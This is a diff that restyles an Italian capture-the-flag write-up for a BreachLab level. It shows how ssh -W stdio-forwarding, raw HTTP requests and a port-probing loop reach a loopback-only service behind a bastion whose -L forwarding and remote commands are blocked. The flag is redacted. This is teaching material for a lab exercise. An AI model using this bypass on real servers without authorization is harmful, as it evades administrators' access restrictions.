@@ -1,16 +1,26 @@
-# Phantom Track - Phantom 16
+```
+ ========================================================================
+   B R E A C H L A B   ::   F I E L D   N O T E S
+ ------------------------------------------------------------------------
+   phantom track · phile 0x10 · "the tunnel"
+ ========================================================================
 
-[← Torna all'indice](../../README.md)
+   target ..: phantom-16  "The Tunnel"
+   class ...: pivoting · ssh stdio-forward (-W)
+   tools ...: ssh -W · raw HTTP
+   author ..: noflyfre
+   status ..: owned
+```
 
-## Sommario
+[← indice](../../README.md)
 
-- Track: Phantom Track
-- Livello: Phantom 16 — The Tunnel
-- Fonte appunti: `phantom_track/phantom16/notes.md`
+> il servizio con la flag è bound su loopback dietro un bastion che già
+> possiedi. `-L` è murato lato server, i comandi remoti pure. ma SSH è più
+> di una shell: `-W` apre un canale TCP diretto e passa lo stesso.
 
-## Obiettivo
+## ----[ 0x00 · intel ]----
 
-Dal BRIEFING del livello:
+Dal brief:
 
 ```text
 MISSION: The Tunnel
@@ -29,18 +39,20 @@ figure out how to reach a loopback-bound service through a bastion you
 already own.
 ```
 
-Obiettivo: dall'entry host `10.13.37.2` raggiungere un servizio HTTP legato solo a `127.0.0.1` sull'host `10.13.37.30`, usando SSH come bastion con la chiave privata fornita.
+Obiettivo: dall'entry host `10.13.37.2` raggiungere un servizio HTTP legato
+solo a `127.0.0.1` su `10.13.37.30`, usando SSH come bastion con la chiave
+fornita.
 
-## Ricognizione
+## ----[ 0x01 · recon ]----
 
-Prima serie di tentativi con port forwarding locale classico (`-L`):
+Local forward classico (`-L`):
 
 ```bash
 ssh -L 8080:localhost:80 ops@10.13.37.30
 ops@10.13.37.30: Permission denied (publickey).
 ```
 
-Serve specificare esplicitamente la chiave privata fornita:
+Serve la chiave esplicita:
 
 ```bash
 ssh -i ./.ssh/id_ed25519_ops -L 8080:localhost:80 ops@10.13.37.30
@@ -48,7 +60,8 @@ PTY allocation request failed on channel 2
 ^C
 ```
 
-L'allocazione di un PTY fallisce (indicando una shell interattiva ristretta o disabilitata sull'account `ops`). Provando `-N` (nessun comando remoto, solo forwarding) in background:
+PTY fallisce (shell interattiva ristretta/disabilitata su `ops`). Con `-N`
+in background:
 
 ```bash
 ssh -i ./.ssh/id_ed25519_ops -L 8080:localhost:80 ops@10.13.37.30 -N &
@@ -57,26 +70,31 @@ channel 2: open failed: administratively prohibited: open failed
 curl: (56) Recv failure: Connection reset by peer
 ```
 
-Il forwarding locale classico viene rifiutato lato server con `administratively prohibited`, sintomo tipico di una configurazione server-side che disabilita il `-L`/port-forwarding "a listener" (es. restrizioni in `authorized_keys` o `sshd_config` come `no-port-forwarding` / `PermitOpen`), pur permettendo comunque connessioni SSH.
-
-Tentativo di eseguire direttamente un comando remoto per bypassare il problema:
+Il forward locale è rifiutato lato server (`administratively prohibited`):
+`no-port-forwarding`/`PermitOpen` in `authorized_keys`/`sshd_config`. E
+anche i comandi remoti sono vietati:
 
 ```bash
 ssh -i ./.ssh/id_ed25519_ops ops@10.13.37.30 curl http://127.0.0.1:80
 restricted endpoint
 ```
 
-L'account `ops` risponde con `restricted endpoint`: anche l'esecuzione di comandi arbitrari è vietata (probabile `command=` forzato in `authorized_keys`), confermando che l'accesso è limitato a un uso molto specifico del canale SSH.
+`command=` forzato: l'accesso è limitato a un uso molto specifico del
+canale.
 
-## Tecnica
+## ----[ 0x02 · il difetto ]----
 
-Quando `-L` (local port forwarding con listener) è bloccato da restrizioni server-side ma il client possiede comunque una chiave valida per instaurare una sessione SSH, un'alternativa è l'opzione `-W host:port` del client OpenSSH: apre un singolo canale TCP diretto (stdio-forwarding) verso `host:port` attraverso la connessione SSH, senza richiedere l'apertura di un listener locale né l'esecuzione di comandi remoti arbitrari. Di fatto, standard input/output del client SSH vengono collegati direttamente al socket remoto.
+Con `-L` bloccato ma una chiave valida in mano, l'alternativa è `-W
+host:port`: apre un singolo canale TCP diretto (stdio-forwarding) verso
+`host:port` attraverso SSH, senza listener locale né comandi remoti — stdin/
+stdout del client collegati direttamente al socket remoto. Ci si passa a
+mano una richiesta HTTP grezza (HTTP/1.0 raw), bypassando le restrizioni
+sul port-forwarding classico, perché `-W` usa un meccanismo diverso spesso
+non coperto dalle stesse direttive.
 
-Questo permette di instradare a mano una richiesta HTTP grezza (scritta come testo RAW HTTP/1.0) attraverso il tunnel, bypassando le restrizioni configurate per il port-forwarding "classico" — perché `-W` sfrutta un meccanismo di forwarding diverso, spesso non coperto dalle stesse direttive restrittive.
+## ----[ 0x03 · exploit ]----
 
-## Sfruttamento
-
-1. Tentativo (fallito) di stdio-forwarding diretto sulla porta 80:
+1. Tentativo di stdio-forward diretto sulla 80:
 
 ```bash
 echo -e "GET / HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n" | ssh -i ./.ssh/id_ed25519_ops -W 127.0.0.1:80 ops@10.13.37.30
@@ -84,9 +102,11 @@ channel 0: open failed: administratively prohibited: open failed
 stdio forwarding failed
 ```
 
-Anche la porta 80 risulta esplicitamente bloccata: il servizio HTTP non è (o non è più) in ascolto lì, oppure quella porta specifica è nella lista nera del server.
+La 80 è esplicitamente bloccata: il servizio è altrove, o quella porta è in
+blacklist.
 
-2. Ipotesi: il servizio HTTP potrebbe essere in ascolto su una porta diversa dalla 80. Scansione manuale delle porte comuni via loop, riutilizzando `-W` per ciascun tentativo e inviando una richiesta HTTP/1.0 grezza:
+2. Ipotesi: porta diversa. Scan manuale delle porte comuni via loop, `-W`
+   per ognuna con richiesta HTTP/1.0 raw:
 
 ```bash
 for port in 80 8080 8000 3000 5000; do
@@ -94,7 +114,8 @@ for port in 80 8080 8000 3000 5000; do
 done
 ```
 
-3. Una delle porte risponde con una risposta HTTP valida, servita da un semplice server Python:
+3. Una porta risponde con un HTTP valido, servito da un semplice server
+   Python:
 
 ```
 HTTP/1.0 200 OK
@@ -106,20 +127,16 @@ Content-Length: 27
 <REDACTED_FLAG>
 ```
 
-## Risultato
+## ----[ 0x04 · loot ]----
 
-Usando `ssh -W host:port` per instradare manualmente una richiesta HTTP grezza attraverso il tunnel SSH (bypassando le restrizioni sul port-forwarding classico), è stato possibile raggiungere il servizio HTTP bound a loopback su `10.13.37.30` e recuperare la flag del livello:
+`ssh -W host:port` per instradare una richiesta HTTP grezza dentro il
+tunnel (bypassando le restrizioni sul forward classico) raggiunge il
+servizio loopback su `10.13.37.30` e consegna la flag (valore fuori dal
+writeup). Lezione: quando `-L` è murato, `-W` spesso passa dalla porta di
+servizio.
 
 ```
-<REDACTED_FLAG>
+--[ eof ]---------------------------------------------------------------
+
+  breachlab.org · phantom track
 ```
-
-## Nota di pubblicazione
-
-Questa è la versione pensata per pubblicazione su GitHub, secondo la dottrina BreachLab: il metodo (individuazione delle restrizioni di port-forwarding, uso di `ssh -W` per lo stdio-forwarding, costruzione manuale di una richiesta HTTP raw, scansione delle porte comuni) è spiegato per intero — comandi, percorsi e sintassi restano in chiaro — ma il valore letterale della flag, che appare due volte identica nelle note originali, è stato rimosso in entrambe le occorrenze.
-
----
-
-## Crediti
-
-Livello risolto su BreachLab — https://breachlab.org (Phantom Track). Writeup pubblicato nel rispetto delle regole della piattaforma: si insegna la tecnica, non si condivide la risposta.
